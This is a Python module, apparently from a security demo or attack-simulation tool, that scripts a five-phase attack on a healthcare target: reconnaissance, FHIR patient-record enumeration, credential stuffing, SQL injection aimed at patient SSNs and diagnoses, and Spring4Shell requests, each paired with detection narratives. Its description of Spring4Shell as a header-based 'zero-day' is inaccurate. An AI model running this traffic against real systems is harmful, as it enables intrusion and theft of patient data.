"""
Healthcare scenario — Operation HIPAA Breach
5-phase attack chain targeting MedCore Health Systems.
"""

import random

from attacks.engine import send_request, log_phase_event, sleep_between_requests
from attacks.payloads.healthcare import (
    RECON_PATHS, SCANNER_AGENTS, PATIENT_IDS, COMMON_SURNAMES,
    EHR_USERNAMES, EHR_PASSWORDS, SQLI_PHI, SPRING4SHELL_PAYLOADS,
)

INDUSTRY_NAME = "Healthcare"
CAMPAIGN_NAME = "Operation HIPAA Breach"
INDUSTRY_COLOR = "#1e8449"
INDUSTRY_ICON = "💊"


def fire_phase_1_one(target, log_buffer, log_counter, stop_flag):
    path = random.choice(RECON_PATHS)
    agent = random.choice(SCANNER_AGENTS)
    send_request(
        url=f"{target}{path}",
        headers={"User-Agent": agent},
        label=f"Healthcare Recon → {path}",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=1, industry="healthcare",
    )


def fire_phase_1_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 1: Healthcare System Reconnaissance — mapping patient portal and FHIR API", 1, "healthcare", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_1_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_2_one(target, log_buffer, log_counter, stop_flag):
    patient_id = random.choice(PATIENT_IDS)
    if random.random() < 0.3:
        surname = random.choice(COMMON_SURNAMES)
        send_request(
            url=f"{target}/portal/patient-search",
            params={"name": surname},
            label=f"PHI Enumeration → patient-search?name={surname}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="healthcare",
        )
    else:
        send_request(
            url=f"{target}/api/fhir/Patient/{patient_id}",
            label=f"PHI Enumeration → FHIR Patient/{patient_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="healthcare",
        )


def fire_phase_2_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 2: Patient Data Enumeration — sequential FHIR Patient resource probing", 2, "healthcare", log_buffer, log_counter)
    for i in range(count):
        if stop_flag and stop_flag.is_set():
            break
        patient_id = 1001 + (i % 50)
        send_request(
            url=f"{target}/api/fhir/Patient/{patient_id}",
            label=f"PHI Enumeration → FHIR Patient/{patient_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="healthcare",
        )
        sleep_between_requests(custom_range=delay_range)


def fire_phase_3_one(target, log_buffer, log_counter, stop_flag):
    send_request(
        url=f"{target}/portal/login",
        method="POST",
        data={
            "username": random.choice(EHR_USERNAMES),
            "password": random.choice(EHR_PASSWORDS),
            "action": "login",
        },
        label="EHR Credential Stuffing → /portal/login",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=3, industry="healthcare",
    )


def fire_phase_3_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 3: EHR Credential Attack — targeted stuffing using hospital staff naming conventions", 3, "healthcare", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_3_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_4_one(target, log_buffer, log_counter, stop_flag):
    payload = random.choice(SQLI_PHI)
    endpoint = random.choice(["/portal/patient-search", "/api/v1/patients", "/api/lab-results"])
    if endpoint == "/api/lab-results":
        send_request(
            url=f"{target}{endpoint}",
            method="POST",
            data={"patient_id": payload},
            label=f"SQLi PHI → {payload[:60]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="healthcare",
        )
    else:
        send_request(
            url=f"{target}{endpoint}",
            params={"name": payload} if "search" in endpoint else {"id": payload},
            label=f"SQLi PHI → {payload[:60]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="healthcare",
        )


def fire_phase_4_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 4: Patient Database Exploitation — SQL injection targeting PHI records (SSN, DOB, diagnosis)", 4, "healthcare", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_4_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_5_one(target, log_buffer, log_counter, stop_flag):
    cve = random.choice(SPRING4SHELL_PAYLOADS)
    send_request(
        url=f"{target}/api/fhir/Patient",
        method="POST",
        data={"resourceType": "Patient", "id": "exploit"},
        headers={
            "User-Agent": cve["ua"],
            "X-Api-Version": cve["header_value"],
            "X-Request-ID": cve["x_request_id"],
        },
        label="Spring4Shell CVE-2022-22965 → /api/fhir/Patient",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=5, industry="healthcare",
    )


def fire_phase_5_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event("Phase 5: FHIR API Zero-Day — Spring4Shell CVE-2022-22965 targeting Java Spring FHIR server", 5, "healthcare", log_buffer, log_counter)
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_5_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


PHASES = [
    {
        "number": 1,
        "name": "Healthcare System Reconnaissance",
        "description": "Attacker mapping patient portal, EHR system, and FHIR API endpoints",
        "what_fires": "FHIR endpoint discovery, patient portal probing, HL7 interface scanning, .well-known/smart-configuration",
        "cloudflare_story": "Scanner fingerprint on healthcare-specific endpoints. FHIR API enumeration detected. Bot score 3/100.",
        "sentinelone_story": "Attacker specifically targeting FHIR R4 API — this is targeted, not opportunistic. Alert to privacy officer.",
        "hyperautomation": "FHIR endpoint scanning pattern → Alert privacy officer, log for HIPAA audit trail, auto-challenge IP",
        "fire_one": fire_phase_1_one,
        "fire_many": fire_phase_1_many,
    },
    {
        "number": 2,
        "name": "Patient Data Enumeration",
        "description": "Attacker probing patient records API with sequential patient IDs to map PHI availability",
        "what_fires": "Sequential GET /api/fhir/Patient/1001→1050, /portal/patient-search?name=Smith (surname enumeration)",
        "cloudflare_story": "Unusual sequential FHIR Patient resource access — 50 requests in 45 seconds. Enumeration pattern detected.",
        "sentinelone_story": "Pattern matches known PHI harvesting technique. Same source IP as Phase 1. Incident escalating to medium severity.",
        "hyperautomation": "Sequential patient record access → Block IP, notify Privacy Officer, flag for HIPAA breach assessment",
        "fire_one": fire_phase_2_one,
        "fire_many": fire_phase_2_many,
    },
    {
        "number": 3,
        "name": "EHR System Credential Attack",
        "description": "Targeted credential stuffing against Electronic Health Record system login with staff naming patterns",
        "what_fires": "POST /portal/login with healthcare staff usernames (dr.johnson, nurse.smith), hospital password patterns",
        "cloudflare_story": "Rate limiting on /portal/login — 150 attempts in 90 seconds. Distributed across multiple IPs.",
        "sentinelone_story": "Credential stuffing using hospital staff naming convention. Attacker has insider knowledge of org structure.",
        "hyperautomation": "Healthcare portal credential stuffing → Lock all non-MFA accounts, alert IT security, force re-authentication",
        "fire_one": fire_phase_3_one,
        "fire_many": fire_phase_3_many,
    },
    {
        "number": 4,
        "name": "Patient Database Exploitation",
        "description": "SQL injection attack attempting bulk patient PHI extraction (SSN, DOB, diagnosis)",
        "what_fires": "SQLi on /portal/patient-search (UNION SELECT ssn,dob,diagnosis), POST /api/lab-results with injection",
        "cloudflare_story": "OWASP SQLi rule fired on patient search. WAFSQLiAttackScore: 97. Attempted PHI exfiltration blocked.",
        "sentinelone_story": "Attacker attempting to UNION-inject patient SSN, DOB, and diagnosis data. HIPAA breach attempt — Critical severity.",
        "hyperautomation": "SQLi on patient data endpoint → Critical HIPAA incident, freeze API, notify breach response team, start 72-hour HIPAA clock",
        "fire_one": fire_phase_4_one,
        "fire_many": fire_phase_4_many,
    },
    {
        "number": 5,
        "name": "FHIR API Zero-Day Exploitation",
        "description": "Spring4Shell exploit targeting Java Spring Framework FHIR API server for complete PHI database access",
        "what_fires": "CVE-2022-22965 Spring4Shell in User-Agent + X-Api-Version headers on /api/fhir/Patient endpoint",
        "cloudflare_story": "CVE-2022-22965 signature rule block. WAFRCEAttackScore: 99. FirewallForAIInjectionScore: 100.",
        "sentinelone_story": "Nation-state or well-funded criminal group. Spring4Shell on FHIR server = complete PHI database access if successful. Full 5-phase campaign correlated.",
        "hyperautomation": "Spring4Shell on FHIR → Isolate FHIR API server, invoke HIPAA breach response plan, notify HHS within 72 hours, push emergency Cloudflare block rule",
        "fire_one": fire_phase_5_one,
        "fire_many": fire_phase_5_many,
    },
]
